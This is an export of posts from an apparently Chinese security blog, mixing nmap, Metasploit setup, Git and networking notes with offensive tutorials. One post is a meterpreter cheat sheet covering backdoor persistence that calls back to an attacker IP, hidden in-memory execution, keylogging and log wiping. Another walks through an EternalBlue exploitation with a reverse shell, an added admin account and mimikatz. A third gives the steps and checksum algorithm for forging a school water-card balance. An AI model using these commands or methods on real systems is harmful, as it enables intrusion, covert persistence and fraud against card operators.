[{"title":"meterpreter会话渗透利用常用的32个命令归纳","date":"2018-12-16T11:45:20.000Z","path":"/posts/ea141142/","text":"仅作渗透测试技术试验之用，请勿针对任何未授权网络和设备 1、background命令返回，把meterpreter后台挂起2、session命令session命令可以查看已经成功获取的会话可以使用session -i连接到指定序号的meterpreter会话以继续利用3、shell命令获取目标主机的远程命令shell如果出错，考虑是目标主机限制了cmd.exe的访问权，可以使用migrate注入到管理员用户进程中再尝试 4、cat命令查看目标主机上的文档内容例如：cat C:\\boot.ini查看目标主机的启动引导信息5、getwd命令获取系统工作的当前目录6、upload命令上传文件到目标主机，例如把后门程序setup.exe传到system32目录下meterpreter&gt; upload setup.exe C:\\\\windows\\\\system32\\7、download命令把目标主机上的文件下载到我们的攻击机上download C:\\boot.ini /root/8、edit命令调用vi编辑器，对目标主机上的文件修改例如修改目标主机上的host文件，使目标主机访问baidu时去到准备好的钓鱼网站9、search命令在目标主机文件系统上查找搜索文件例如：search -d c:\\ -f *.doc10、ipconfig我略。。。11、portfwd命令端口转发例如目标主机上开启了3390，但是只允许特定ip访问，攻击机无法连接，可以使用portfwd命令把目标主机的3389端口转发到其他端口打开 例如：portfwd add -l 1122 -p 3389 -r 192.168.1.2 把目标主机192.168.1.2的3389端口转发到1122端口这时只需要连接目标的1122端口就可以打开远程桌面了rdesktop -u administrator -p Abc123456 192.168.1.2:112212、route命令略。。。13、getuid查看meterpreter注入到目标主机的进程所属用户14、sysinfo查看目标主机系统信息15、ps命令查看目标主机上运行的进程信息16、migrate将meterpreter会话移植到另一个进程例如反弹的meterpreter会话是对方打开了一个你预置特殊代码的Word文档而产生的，那么对方一旦关闭掉该Word文档，我们获取到meterpreter会话也随之关闭，所以把会话注入到explorer.exe是一个好方法可以先用ps命令看一下目标主机的explorer.exe进程的pid 例如migrate 1668把meterpreter会话注入进去pid为1688进程的explorer.exe 17、execute命令在目标主机上运行某个程序例如我们运行一下目标主机上的记事本程序execute -f notepad.exe目标主机立马弹出一个记事本程序这样太明显，如果希望隐藏后台执行，加参数-Hexecute -H -f notepad.exe此时目标主机桌面没反应，但我们在meterpreter会话上使用ps命令看到了再看一个，我们运行目标主机上的cmd.exe程序，并以隐藏的方式直接交互到我们的meterpreter会话上命令：execute -H -i -f cmd.exe这达到的效果就跟使用shell命令一样了 再来一个，在目标主机内存中直接执行我们攻击主机上的攻击程序，比如wce.exe，又比如木马等，这样可以避免攻击程序存储到目标主机硬盘上被发现或被查杀。execute -H -m -d notepad.exe -f wce.exe -a &quot;-o wce.txt&quot;-d 在目标主机执行时显示的进程名称（用以伪装）-m 直接从内存中执行“-o wce.txt”是wce.exe的运行参数 18、getpid获取meterpreter会话在目标主机上注入进程的进程号 19、调用post/windows/gather/checkvm后渗透模块，确定目标主机是否是一台虚拟机 run post/windows/gather/checkvm 20、persistence后渗透模块向目标主机植入后门程序 run persistencce -X -i 5 -p 4444 -r 192.169.23.124-X 在目标主机上开机自启动-i 不断尝试反向连接的时间间隔 21、调用getgui后渗透攻击模块作用：开启目标主机远程桌面，并可添加管理员组账号命令：run getgui -e开启目标主机的远程桌面服务后，可以添加账号以便利用命令：run getgui -u kali -p 123456执行成功，可以使用kali的rdesktop命令使用远程桌面连接目标主机rdesktop -u kali -p meterpreter 192.168.250.176:3389 22、提权命令getsysem 23、键盘记录器功能keyscankeyscan_start 开启记录目标主机的键盘输入keyscan_dump 输出截获的目标键盘输入字符信息keyscan_stop 停止键盘记录 24、clearev命令入侵痕迹擦除在渗透利用过程中难免留下日志等信息痕迹，使用clearev命令擦除后再跑 。。。。","tags":[{"name":"kali","slug":"kali","permalink":"http://www.deops.cn/tags/kali/"},{"name":"msf","slug":"msf","permalink":"http://www.deops.cn/tags/msf/"}]},{"title":"nmap使用指南","date":"2018-12-16T10:34:57.000Z","path":"/posts/4a2cdcee/","text":"-sC 是指的是采用默认配置扫描，与–script=default参数等价 –script=脚本名称，脚本一般都在Nmap的安装目录下的scripts目录中那么Linux下可以查看脚本数量： ls /usr/share/nmap/scripts/ | wc -l 那么我当前的Nmap是有516个很使用的漏洞利用、工具脚本。也可以使用下面一条命令导出 ～ ls /usr/share/nmap/scripts/ | sed ‘s/.nse//‘ &gt; scripts.list 实战现在我们用一个很简单的脚本，telnet爆破脚本，我们搜索一下： root@ThundeRobot:/usr/share/nmap# ls /usr/share/nmap/scripts/ | grep telnettelnet-brute.nsetelnet-encryption.nse","tags":[{"name":"kali","slug":"kali","permalink":"http://www.deops.cn/tags/kali/"},{"name":"nmap","slug":"nmap","permalink":"http://www.deops.cn/tags/nmap/"}]},{"title":"kali工具Metasploit首次启动配置","date":"2018-12-16T10:17:53.000Z","path":"/posts/b1114d7a/","text":"简述 由于Kali Linux网络服务策略,Kali将不会自启动的网络服务,数据库服务包括在内.所以为了Metasploit以支持数据库的方式启动，需要运行一些必要的步骤.官方文档https://docs.kali.org/general-use/starting-metasploit-framework-in-kali 步骤启动PostgreSQL服务因为Metasploit 使用PostgreSQL作为数据库，所以必须先启PostgreSQL服务。在命令行下输入下面命令： service postgresql start 执行成功后，可以通过ss -ant命令查看端口5432是否在侦听，去验证PostgreSQL服务是否成功开启。12345State Recv-Q Send-Q Local Address:Port Peer Address:Port LISTEN 0 128 :::22 :::* LISTEN 0 128 *:22 *:* LISTEN 0 128 127.0.0.1:5432 *:* LISTEN 0 128 ::1:5432 :::* 初始化MetasploitPostgreSQL运行后，我们需要去新建以及初始化msfmsfdb init 启动MetasploitPostgreSQL服务启动后，现在可以启动msfconsole然后使用命令db_status去验证数据库是否成功连接。msfconsole123msf&gt; db_status [*] postgresql connected to msf msf&gt; 验证 到这里，数据已经连接上了，但是我们使用search命令依然会提示使用慢搜索。我们以ms08-067为例： msf&gt; search ms08-067[!] Module database cache not built yet, using slow search提示这个信息，其实Metasploit已经连接上数据库，但是没有建立数据库缓存。 重新构建数据库缓存这时，需要重新构建数据库缓存，在msf提示符下执行以下命令: msf&gt; db_rebuild_cache [*] Purging and rebuilding the module cache In the background..构建缓存会在后台运行，稍等几分钟后，重启msf控制台，即可使用搜索模块了。 设置PostgreSQL服务开机自启使用命令update-rc.d postgresql enable将PostgreSQL服务添加至开机启动项中，这样就不用每次使用msf都要开启和PostgreSQL服务了。","tags":[{"name":"kali","slug":"kali","permalink":"http://www.deops.cn/tags/kali/"},{"name":"MSF","slug":"MSF","permalink":"http://www.deops.cn/tags/MSF/"}]},{"title":"MSF框架实现\"永恒之蓝\"的攻击演示","date":"2018-12-16T08:39:58.000Z","path":"/posts/af5d3de9/","text":"仅供技术学习，遵守国家法律，切勿用于非法攻击！ 作者：myles007原文:https://www.anquanke.com/post/id/86245 一、攻击简介其实我们这里所说的使用MSF 实现 “永恒之蓝”的快速攻击，就是利用Metasploit中近期更新的针对ms17-101漏洞的攻击载荷进行攻击获取主机控制权限。我这里简单的记录下整个攻击利用所需要的工具准备、利用过程以及后渗透的一些简单内容。 二、工具准备0x01 nmap环境准备（1）请将Nmap安装到当前最新版本(7.40以上)；（2）确保 script脚本中包含smb-vuln-ms17-010.nse脚本；在后面扫描检测是需要用到此脚本进行漏洞扫描检查，有关script脚本的存放位置在Nmap安装根目录下的有个“script”目录，直接进入搜索“ms17-010”，存在则无需再下载。 （3）相关软件下载nmap下载地址：https://nmap.org/download.htmlsmb-vuln-ms17-010.nse下载地址：https://nmap.org/nsedoc/scripts/smb-vuln-ms17-010.html 0x02 MSF环境准备metasploit 其默认在kali中就自带有整个攻击框架，后续我们对我们简称其为MSF框架。因为我们要用到针对“永恒之蓝”漏洞的攻击，故需要将MSF框架升级到最新版本，至少在4.14.17版本以上。 0x03 kali环境要求建议大家直接使用kali2.0的环境，这样后续进行MSF框架的升级也比较方便，不容易出现各种未知的问题，方面我们后续渗透攻击的展开。（1） 编辑 kali 更新源首先我配置kali的更新源：直接编辑更新源的配置文件“/etc/apt/sources.list” ,然后将下面的源复制进去保存即可。（2）更新 kali系统kali 源更新完后，我们进kali 内核的更新，具体更方法如下。 root@kali:apt-get install linux-headers-$(uname -r)#注：如果报错了的话可以输入这个试试aptitude -r install linux-headers-$(uname -r) 0x04 2.2.2 MSF攻击框架版本要求MSF框架版本要求在 4.11.17版本以上 三、主机发现对于主机的发现，我们可以使用的方法很多，这里简单记录和说明几种，供大家共同学习，每个人可根据主机的喜欢选择使用。 fping在kali系统中自带有fping这个扫描工具，有关于主机发现的扫描命令如下。 fping -asg 192.168.1.0/24 nbtscan nbtscan -r 192.168.1.0/24 nmap关于namp 主机发现与扫描功能的强大，我们这里简单了记录几种个人常用的扫描方法。（1） ping 包扫描 nmap -n -sS 192.168.1.0/24（2） 指定端口发现扫描nmap -n -p445 192..168.1.0/24（3） 针对漏洞脚本的定向扫描nmap -n -p445 –script smb-vuln-ms17-010 192.168.1.0/24 –open 四、漏洞扫面在确定目标范围中那些主机是存活后，我们可以进行定向445端口的漏洞脚本扫描了，直接找到存在漏洞的目标主机，为后续的MSF攻击提供目标。 其实说到这里，大家会发现上面第三章节“主机发现”这一步，我们可以直接跳过，直接进定向445共享端口的漏洞扫描，上面之所以写出了，也是为了自己以后的学习和使用做一个笔记和记录。 nmap漏洞扫面MS17-101漏洞定向扫描命令如下： nmap -n -p445 –script smb-vuln-ms17-010 192.168.1.0/24 –open 通过namp的445端口定向漏洞扫描发现192.168.23.42存在漏洞 MSF Auxiliary辅助扫面我们也可以直接使用MSF框架的辅助模块“”auxiliary”中的扫描模块进行扫描。了解MSF的同学肯定都知道，MSF的扫描模块基本也就是调用nmap扫描来实现的。 msfconsole # 进入MSF框架version # 确认下MSF的版本search ms17_010 # 查找漏洞模块的具体路径use auxiliary/scanner/smb/smb_ms17_010 # 调用漏洞扫描模块show option # 查看模块配置选项set RHOST 192.168.1.1-254 # 配置扫描目标set THREADS 30 #配置扫描线程run #运行脚本 这个使用下来，我们发现其实还没有namp 一条命令就搞定了，来的方便。 五、漏洞利用通过以上所有环境的准备和漏洞扫描主机的发现，接下来使用MSF框架进行MS17-10漏洞的攻击，也就是“几秒”中的事情了，具体使用方法和过程记录如下。 ms17-010 漏洞利用之MSF使用方法 msfconsole # 进入MSF 框架version # 确保MSF框架版本在 4.14.17以上；search ms17_010 # 漏洞模块路径查询set exploit/windows/smb/ms17_010_eternalblue # 调用攻击模块set RHOST 192.168.1.112 # 设定攻击目标exploit # 发起攻击 六、维持访问这里的说到维持访问，主要是想记录下关于使用meterpreter这个攻击载荷模块，我们在利用漏洞的过程中，如果可以使用meterpreter攻击载荷模块，尽量使用这个模块。 [理论]payload 攻击载荷理论说到这里就就普及下MSF框架下关于“payload”攻击载荷的基本概念，那么什么是payload呢？payload又称为攻击载荷，主要是用来建立目标机与攻击机稳定连接的，并返回一个shell，也可以进行程序注入等，payload有3种类型。 [理论]single（独立载荷）从这个英文单词single,就可以大概知道这类payload是个独立，单独的意思，其实在结合定义我们就可以看出，攻击载荷一般做两件事情一、就是建立目标主机与攻击主机之间的网络连接；二、就是在连接建立的基础上获取目标主机的控制权限，即获取可供操作的shell。 [理论]stagers（传输器载荷）在理解了一个完整的payload是有两部分组成的基础上，我们可以理解我们这里所说的结合体了，其实就是将原本的single独立体分割为了两个部分：“传输器载荷”与“传输体载荷”（stages &amp; stagers）比如“windows/meterpreter/reverse_tcp”是由一个传输器载荷（reverse_tcp）和一个传输体载荷（meterpreter）所组成的，其功能等价于独立攻击载荷“windows/shell_reverse_tcp” 攻击载荷配置过程调用exploit攻击 use exploit/windows/smb/ms17_010_eternalblueset rhost 192.168.1.112 配置攻击载荷 set payload windows/x64/meterpreter/reverse_tcpset lhost 192.168.1.22 发起攻击 exploit 获取shell getuid meterpreter功能展现桌面抓图 meterpreter&gt; screenshot 视频开启 meterpreter&gt; webcam_scream 开启远程桌面 meterpreter&gt; run post/windows/manage/enable_rdp 添加管理员账号 shellnet user test 123456 /addnet localgroup Administrators test /add … # 一直没有回显，怀疑是由于安装了360导致的，后来进过验证的确是这原因，所有说安装个360还是很有用的，不要总是说人家是流氓软件，不是打广告哈,切实感受… 获取系统管理员密码想直接添加账号进行提权，前面操作是不了，那么我们现在就出杀手锏，直接使用mimikatz来获取系统管理账号的密码。 第一步：载入mimikatz meterpreter&gt; load mimikatzmeterpreter&gt; wdigest kali远程连接Windows root# rdesktop 192.168.1.22 -u user -p passw0rd","tags":[{"name":"网络安全","slug":"网络安全","permalink":"http://www.deops.cn/tags/网络安全/"},{"name":"kali","slug":"kali","permalink":"http://www.deops.cn/tags/kali/"},{"name":"MSF","slug":"MSF","permalink":"http://www.deops.cn/tags/MSF/"}]},{"title":"RFID安全之关于某校水卡的破解","date":"2018-10-29T01:11:16.000Z","path":"/posts/2468d0a2/","text":"仅作技术研究与交流，请勿用于非法用途，否则后果自负 最近天气比较凉，想洗点热水澡，无奈两个宿舍供用一张热水卡，很快就刷完余额了。然后一想到又要冲饭卡吃饭又要冲水卡洗澡，学校的物价还贼鸡儿贵，像我这种是穷逼的日子是越来越不好过了。然后……我有个大胆想法(手动滑稽)来次社区送温暖 现在关于RFID技术的文章在网上已经不少了，百度一搜一大堆。然后这次我也来写一篇关于学校热水卡的破解。 #实际安全测试工具：ACR122U-A9读卡器，某宝100多块钱有点贵；入门的话可以选择便宜很多的PN532无线模块开发板，某宝50块钱不到；电脑的话Windows或者Linux都可以；准备：根据卡片信息查找相关信息、四周无人、刷卡器周围是否有网线、判断水卡类型一张可用的水卡+一张没有数据的UID白卡； 1. 首先读取水卡，判断水卡类型 和 读取基本内容我这里推荐使用Linux来破解，之前弄RFID的时候，发现很多win下的工具无法写入，不知道为什么，看来还是LInux下的东西比较靠谱点。直接将ACR122U插入电脑，让kali连接，使用mfoc命令读取卡片的内容 mfoc -O -k ffffffffffff card.mfd-O,读取并导出保存到card.mfd，-k ff…，使用默认密钥来破译加密内容 导出后使用hexdump命令查看数据并分析 hexdump card.mfd 很幸运，我们学校的的水卡加密很简单，单区间加密破解到这里基本已经完成了，知道密码就可以完全复制一张出来了但是，好奇心使我想继续研究下去，前面那些完全没有技术含量， 2. 数据分析及修改RFID的破解都只是铺垫，数据修改才是整个过程最有趣的地方，因为每种卡片的数据算法不一样，网络上的数据分析只能提供参考，不能直接得出数据的算法。只能通过多次导出数据，对比变化的数据猜测寻找出具体的算法。数据分析需要进过多次比较分析，寻找比较找出正确的规律，我这次大大小小肝了一个星期的时间才完成了分析，真实难受进过多次刷卡后，对比变化的数据如下： 对比这两次数据 我发现只有3扇区的1块和2块数据发生了改变 3. 重点分析3扇区中的数据 涉及变动的有前面的两个字节和最后一个字节因为对十六进制运算不熟悉，所以先直接转换成十进制方便运算找规律，因为金额与数据有关，我也将卡内余额转换成16进制去对比。但是因为有小数点，可以扩大倍数，可以10 100 1000倍–尝试分析。因为我水卡后面有两位小数，按着思维走小数点尝试100倍。首先我这里的余额是86.60元，然后将金额放大100倍8660转16进制后，发现余额是第一和第二字节的倒序，多组数据验证后正确！而最后一个字节，对比数据发现它随着金额的变化而变化，即该字节应该是校验字节校验字节的算法：将余额的值进行异或运，然后取反，即可得到该字节的校验码例如：21 xor D4 = F5 取反 = 28 尝试修改数据，并验证，可以用winhex打开dump文件修改比如修改成100.00元，用10000然后转16进制–2710–倒序–1027,然后计算校验码即6A保存写入，OK 随便找张图吧，忘记拍下来了(敷衍) 后记该水卡的加密规则不是很复杂，而对于有些涉及次数、时间、滚动码验证的卡怎么破解，因没有其他的卡和设备所以没有深入了解后续的其他破解 #科普部分 RFID是射频识别(Radio Frequency Identification，RFID)的意思，像什么ID卡、IC卡、RFID卡、NFC卡、Mifare卡的都是RFID技术（这些俗称银行卡、公交卡、饭卡、水卡、门禁卡等…) 这里介绍一些比较常见的卡片类型Mifare S50（简称M1)，最常见的卡，独一无二的UID号，无存储修改数据（学生卡，饭卡，公交卡，门禁卡等）Mifare UltraLight(简称MO)，低成本卡，出厂固化UID，可存储修改数据（地铁卡，公交卡）Mifare UID（中国魔术卡，简称UID卡），M1卡的变异版本，可以修改UID号，国外叫Chinese magic card,可以用来完整克隆M1 S50的数据，但是可以被识别屏蔽FUID支持修改UID号，但修改一次后将被锁死成M1卡，大天朝就是牛逼CUID支持多次重写UID号，这难不倒我们智慧的人民群众 常见工具： PN532、ACR122U-A、Proxmark3、Chameleon Mini等相关工具 PN532 ACR122U-A Proxmark3 Chameleon Mini 一些数据分析工具太多了懒得找，我也没有。。。一个WinHex,一个kali就完事了","tags":[{"name":"RFID","slug":"RFID","permalink":"http://www.deops.cn/tags/RFID/"},{"name":"NFC","slug":"NFC","permalink":"http://www.deops.cn/tags/NFC/"},{"name":"无线安全","slug":"无线安全","permalink":"http://www.deops.cn/tags/无线安全/"}]},{"title":"安卓应用程序渗透测试（一）","date":"2018-10-21T12:43:11.000Z","path":"/posts/ef11486f/","text":"导语：在安全行业中，通常采用安卓安全测试来检测安卓APP中的漏洞。Web应用测试之后，人们更加关心的领域便是移动应用测试。我们先从一些基础开始。 在安全行业中，","tags":[]},{"title":"Git用户手册","date":"2018-10-07T08:13:31.000Z","path":"/posts/7dcedd84/","text":"常用GIT GitHub CODING 码云 查看git配置 git config –list配置Git用户 git config –global user.name “myuser”配置Git邮件地址 git config –global user.email emailaddress@mail.com查看Git特定变量 git config user.name 在目录中初始新项目git initgit add *.cgit add README git commit -m ‘initial project version’克隆现有仓库git clone URL[ssh or https]例如git clone git://github.com/schacon/grit.git在当前目录创建一个grit目录，然后将所有项目文件克隆到该目录例如git clone git://github.com/schacon/grit.git mugrit唯一的差别是现在新建的目录成了mygritGit支持许多数据传输协议，git://，http(s)://，user@github.com， Git基础 - 记录每次更新到仓库","tags":[]},{"title":"计算机网络基础知识总结","date":"2018-10-04T14:52:01.000Z","path":"/posts/52752939/","text":"计算机网络基础，网络协议等基础知识总结 [TOC] 计算机网络学习的核心内容就是网络协议的学习。网络协议是为计算机网络中进行数据交换而建立的规则、标准或者说是约定的集合。因为不同用户的数据终端可能采取的字符集是不同的，两者需要进行通信，必须要在一定的标准上进行。一个很形象地比喻就是我们的语言，我们大天朝地广人多，地方性语言也非常丰富，而且方言之间差距巨大。A地区的方言可能B地区的人根本无法接受，所以我们要为全国人名进行沟通建立一个语言标准，这就是我们的普通话的作用。同样，放眼全球，我们与外国友人沟通的标准语言是英语，所以我们才要苦逼的学习英语。 计算机网络协议同我们的语言一样，多种多样。而ARPA公司与1977年到1979年推出了一种名为ARPANET的网络协议受到了广泛的热捧，其中最主要的原因就是它推出了人尽皆知的TCP/IP标准网络协议。目前TCP/IP协议已经成为Internet中的”通用语言”，下图为不同计算机群之间利用TCP/IP进行通信的示意图。 pcsptcomm 1. 网络层次划分为了使不同计算机厂家生产的计算机能够相互通信，以便在更大的范围内建立计算机网络，国际标准化组织（ISO）在1978年提出了”开放系统互联参考模型”，即著名的OSI/RM模型（Open System Interconnection/Reference Model）。它将计算机网络体系结构的通信协议划分为七层，自下而上依次为：物理层（Physics Layer）、数据链路层（Data Link Layer）、网络层（Network Layer）、传输层（Transport Layer）、会话层（Session Layer）、表示层（Presentation Layer）、应用层（Application Layer）。其中第四层完成数据传送服务，上面三层面向用户。除了标准的OSI七层模型以外，常见的网络层次划分还有TCP/IP四层协议以及TCP/IP五层协议，它们之间的对应关系如下图所示： osi tcp 2. OSI七层网络模型TCP/IP协议毫无疑问是互联网的基础协议，没有它就根本不可能上网，任何和互联网有关的操作都离不开TCP/IP协议。不管是OSI七层模型还是TCP/IP的四层、五层模型，每一层中都要自己的专属协议，完成自己相应的工作以及与上下层级之间进行沟通。由于OSI七层模型为网络的标准层次划分，所以我们以OSI七层模型为例从下向上进行一一介绍。 OSI 7 Layer 1）物理层（Physical Layer）激活、维持、关闭通信端点之间的机械特性、电气特性、功能特性以及过程特性。该层为上层协议提供了一个传输数据的可靠的物理媒体。简单的说，物理层确保原始的数据可在各种物理媒体上传输。物理层记住两个重要的设备名称，中继器（Repeater，也叫放大器）和集线器。 2）数据链路层（Data Link Layer）数据链路层在物理层提供的服务的基础上向网络层提供服务，其最基本的服务是将源自网络层来的数据可靠地传输到相邻节点的目标机网络层。为达到这一目的，数据链路必须具备一系列相应的功能，主要有：如何将数据组合成数据块，在数据链路层中称这种数据块为帧（frame），帧是数据链路层的传送单位；如何控制帧在物理信道上的传输，包括如何处理传输差错，如何调节发送速率以使与接收方相匹配；以及在两个网络实体之间提供数据链路通路的建立、维持和释放的管理。数据链路层在不可靠的物理介质上提供可靠的传输。该层的作用包括：物理地址寻址、数据的成帧、流量控制、数据的检错、重发等。 有关数据链路层的重要知识点： 1&gt; 数据链路层为网络层提供可靠的数据传输； 2&gt; 基本数据单位为帧； 3&gt; 主要的协议：以太网协议； 4&gt; 两个重要设备名称：网桥和交换机。 3）网络层（Network Layer） 网络层的目的是实现两个端系统之间的数据透明传送，具体功能包括寻址和路由选择、连接的建立、保持和终止等。它提供的服务使传输层不需要了解网络中的数据传输和交换技术。如果您想用尽量少的词来记住网络层，那就是”路径选择、路由及逻辑寻址”。 网络层中涉及众多的协议，其中包括最重要的协议，也是TCP/IP的核心协议——IP协议。IP协议非常简单，仅仅提供不可靠、无连接的传送服务。IP协议的主要功能有：无连接数据报传输、数据报路由选择和差错控制。与IP协议配套使用实现其功能的还有地址解析协议ARP、逆地址解析协议RARP、因特网报文协议ICMP、因特网组管理协议IGMP。具体的协议我们会在接下来的部分进行总结，有关网络层的重点为： 1&gt; 网络层负责对子网间的数据包进行路由选择。此外，网络层还可以实现拥塞控制、网际互连等功能； 2&gt; 基本数据单位为IP数据报； 3&gt; 包含的主要协议： IP协议（Internet Protocol，因特网互联协议）; ICMP协议（Internet Control Message Protocol，因特网控制报文协议）; ARP协议（Address Resolution Protocol，地址解析协议）; RARP协议（Reverse Address Resolution Protocol，逆地址解析协议）。 4&gt; 重要的设备：路由器。 4）传输层（Transport Layer） 第一个端到端，即主机到主机的层次。传输层负责将上层数据分段并提供端到端的、可靠的或不可靠的传输。此外，传输层还要处理端到端的差错控制和流量控制问题。 传输层的任务是根据通信子网的特性，最佳的利用网络资源，为两个端系统的会话层之间，提供建立、维护和取消传输连接的功能，负责端到端的可靠数据传输。在这一层，信息传送的协议数据单元称为段或报文。 网络层只是根据网络地址将源结点发出的数据包传送到目的结点，而传输层则负责将数据可靠地传送到相应的端口。 有关网络层的重点： 1&gt; 传输层负责将上层数据分段并提供端到端的、可靠的或不可靠的传输以及端到端的差错控制和流量控制问题； 2&gt; 包含的主要协议：TCP协议（Transmission Control Protocol，传输控制协议）、UDP协议（User Datagram Protocol，用户数据报协议）； 3&gt; 重要设备：网关。 5）会话层 会话层管理主机之间的会话进程，即负责建立、管理、终止进程之间的会话。会话层还利用在数据中插入校验点来实现数据的同步。 6）表示层 表示层对上层数据或信息进行变换以保证一个主机应用层信息可以被另一个主机的应用程序理解。表示层的数据转换包括数据的加密、压缩、格式转换等。 7）应用层 为操作系统或网络应用程序提供访问网络服务的接口。 会话层、表示层和应用层重点： 1&gt; 数据传输基本单位为报文； 2&gt; 包含的主要协议：FTP（文件传送协议）、Telnet（远程登录协议）、DNS（域名解析协议）、SMTP（邮件传送协议），POP3协议（邮局协议），HTTP协议（Hyper Text Transfer Protocol）。 3. IP地址1）网络地址 IP地址由网络号（包括子网号）和主机号组成，网络地址的主机号为全0，网络地址代表着整个网络。 2）广播地址 广播地址通常称为直接广播地址，是为了区分受限广播地址。 广播地址与网络地址的主机号正好相反，广播地址中，主机号为全1。当向某个网络的广播地址发送消息时，该网络内的所有主机都能收到该广播消息。 3）组播地址D类地址就是组播地址。先回忆下A，B，C，D类地址吧：A类地址以0开头，第一个字节作为网络号，地址范围为：0.0.0.0~127.255.255.255；(modified @2016.05.31)B类地址以10开头，前两个字节作为网络号，地址范围是：128.0.0.0~191.255.255.255;C类地址以110开头，前三个字节作为网络号，地址范围是：192.0.0.0~223.255.255.255。D类地址以1110开头，地址范围是224.0.0.0~239.255.255.255，D类地址作为组播地址（一对多的通信）；E类地址以1111开头，地址范围是240.0.0.0~255.255.255.255，E类地址为保留地址，供以后使用。注：只有A,B,C有网络号和主机号之分，D类地址和E类地址没有划分网络号和主机号。 4）255.255.255.255 该IP地址指的是受限的广播地址。受限广播地址与一般广播地址（直接广播地址）的区别在于，受限广播地址只能用于本地网络，路由器不会转发以受限广播地址为目的地址的分组；一般广播地址既可在本地广播，也可跨网段广播。例如：主机192.168.1.1/30上的直接广播数据包后，另外一个网段192.168.1.5/30也能收到该数据报；若发送受限广播数据报，则不能收到。 注：一般的广播地址（直接广播地址）能够通过某些路由器（当然不是所有的路由器），而受限的广播地址不能通过路由器。 5）0.0.0.0 常用于寻找自己的IP地址，例如在我们的RARP，BOOTP和DHCP协议中，若某个未知IP地址的无盘机想要知道自己的IP地址，它就以255.255.255.255为目的地址，向本地范围（具体而言是被各个路由器屏蔽的范围内）的服务器发送IP请求分组。 6）回环地址 127.0.0.0/8被用作回环地址，回环地址表示本机的地址，常用于对本机的测试，用的最多的是127.0.0.1。 7）A、B、C类私有地址 私有地址(private address)也叫专用地址，它们不会在全球使用，只具有本地意义。A类私有地址：10.0.0.0/8，范围是：10.0.0.0~10.255.255.255B类私有地址：172.16.0.0/12，范围是：172.16.0.0~172.31.255.255C类私有地址：192.168.0.0/16，范围是：192.168.0.0~192.168.255.255 4. 子网掩码及网络划分随着互连网应用的不断扩大，原先的IPv4的弊端也逐渐暴露出来，即网络号占位太多，而主机号位太少，所以其能提供的主机地址也越来越稀缺，目前除了使用NAT在企业内部利用保留地址自行分配以外，通常都对一个高类别的IP地址进行再划分，以形成多个子网，提供给不同规模的用户群使用。 这里主要是为了在网络分段情况下有效地利用IP地址，通过对主机号的高位部分取作为子网号，从通常的网络位界限中扩展或压缩子网掩码，用来创建某类地址的更多子网。但创建更多的子网时，在每个子网上的可用主机地址数目会比原先减少。 什么是子网掩码？ 子网掩码是标志两个IP地址是否同属于一个子网的，也是32位二进制地址，其每一个为1代表该位是网络位，为0代表主机位。它和IP地址一样也是使用点式十进制来表示的。如果两个IP地址在子网掩码的按位与的计算下所得结果相同，即表明它们共属于同一子网中。 在计算子网掩码时，我们要注意IP地址中的保留地址，即” 0”地址和广播地址，它们是指主机地址或网络地址全为” 0”或” 1”时的IP地址，它们代表着本网络地址和广播地址，一般是不能被计算在内的。 子网掩码的计算： 对于无须再划分成子网的IP地址来说，其子网掩码非常简单，即按照其定义即可写出：如某B类IP地址为 10.12.3.0，无须再分割子网，则该IP地址的子网掩码255.255.0.0。如果它是一个C类地址，则其子网掩码为 255.255.255.0。其它类推，不再详述。下面我们关键要介绍的是一个IP地址，还需要将其高位主机位再作为划分出的子网网络号，剩下的是每个子网的主机号，这时该如何进行每个子网的掩码计算。 下面总结一下有关子网掩码和网络划分常见的面试考题： 1）利用子网数来计算 在求子网掩码之前必须先搞清楚要划分的子网数目，以及每个子网内的所需主机数目。 (1) 将子网数目转化为二进制来表示; 如欲将B类IP地址168.195.0.0划分成27个子网：27=11011； (2) 取得该二进制的位数，为N； 该二进制为五位数，N = 5 (3) 取得该IP地址的类子网掩码，将其主机地址部分的的前N位置1即得出该IP地址划分子网的子网掩码。 将B类地址的子网掩码255.255.0.0的主机地址前5位置 1，得到 255.255.248.0 2）利用主机数来计算 如欲将B类IP地址168.195.0.0划分成若干子网，每个子网内有主机700台： (1) 将主机数目转化为二进制来表示； 700=1010111100 (2) 如果主机数小于或等于254（注意去掉保留的两个IP地址），则取得该主机的二进制位数，为N，这里肯定 N&lt;8。如果大于254，则 N&gt;8，这就是说主机地址将占据不止8位； 该二进制为十位数，N=10； (3) 使用255.255.255.255来将该类IP地址的主机地址位数全部置1，然后从后向前的将N位全部置为 0，即为子网掩码值。 将该B类地址的子网掩码255.255.0.0的主机地址全部置1，得到255.255.255.255，然后再从后向前将后 10位置0,即为：11111111.11111111.11111100.00000000，即255.255.252.0。这就是该欲划分成主机为700台的B类IP地址 168.195.0.0的子网掩码。 3）还有一种题型，要你根据每个网络的主机数量进行子网地址的规划和**计算子网掩码。这也可按上述原则进行计算。**比如一个子网有10台主机，那么对于这个子网需要的IP地址是： 10＋1＋1＋1＝13 注意：加的第一个1是指这个网络连接时所需的网关地址，接着的两个1分别是指网**络地址和广播地址。** 因为13小于16（16等于2的4次方），所以主机位为4位。而256－16＝240，所以该子网掩码为255.255.255.240。 如果一个子网有14台主机，不少人常犯的错误是：依然分配具有16个地址空间的子网，而忘记了给网关分配地址。这样就错误了，因为14＋1＋1＋1＝17，17大于16，所以我们只能分配具有32个地址（32等于2的5次方）空间的子网。这时子网掩码为：255.255.255.224。 5. ARP/RARP协议地址解析协议，即ARP（Address Resolution Protocol），是根据IP地址获取物理地址的一个TCP/IP协议。主机发送信息时将包含目标IP地址的ARP请求广播到网络上的所有主机，并接收返回消息，以此确定目标的物理地址；收到返回消息后将该IP地址和物理地址存入本机ARP缓存中并保留一定时间，下次请求时直接查询ARP缓存以节约资源。地址解析协议是建立在网络中各个主机互相信任的基础上的，网络上的主机可以自主发送ARP应答消息，其他主机收到应答报文时不会检测该报文的真实性就会将其记入本机ARP缓存；由此攻击者就可以向某一主机发送伪ARP应答报文，使其发送的信息无法到达预期的主机或到达错误的主机，这就构成了一个ARP欺骗。ARP命令可用于查询本机ARP缓存中IP地址和MAC地址的对应关系、添加或删除静态对应关系等。 ARP工作流程举例： 主机A的IP地址为192.168.1.1，MAC地址为0A-11-22-33-44-01； 主机B的IP地址为192.168.1.2，MAC地址为0A-11-22-33-44-02； 当主机A要与主机B通信时，地址解析协议可以将主机B的IP地址（192.168.1.2）解析成主机B的MAC地址，以下为工作流程： （1）根据主机A上的路由表内容，IP确定用于访问主机B的转发IP地址是192.168.1.2。然后A主机在自己的本地ARP缓存中检查主机B的匹配MAC地址。 